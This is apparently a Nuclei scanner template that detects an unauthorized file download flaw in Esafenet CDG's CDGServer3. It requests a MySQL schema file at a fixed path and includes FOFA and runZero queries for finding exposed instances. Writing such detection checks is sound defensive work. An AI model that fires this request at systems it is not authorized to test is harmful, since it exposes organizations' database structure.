id: esafenet-mysql-fileread
info:
  name: Esafenet CDG mysql - File Read
  author: DhiyaneshDk
  severity: high
  description: |
    CDGServer3 Unauthorized File Download vulnerability is detected.
  metadata:
    # auto-generated by nuclei-sync — please review before merging
    runzero-match: any(each(service["html.titles"]), {# matches "(?i)电子文档安全管理系统"})
    fofa-query: title="电子文档安全管理系统"
    max-request: 1
    product: electronic_document_security_management_system
    vendor: esafenet
    verified: true
  tags: esafenet,lfi,mysql,vuln
http:
  - matchers:
      - condition: and
        part: body
        type: word
        words:
          - varchar
          - create table
      - part: header
        type: word
        words:
          - application/x-sql
      - status:
          - 200
        type: status
    matchers-condition: and
    max-size: 1000
    method: GET
    path:
      - '{{BaseURL}}/CDGServer3/SQL/MYSQL/create_SmartSec_mysql.sql'
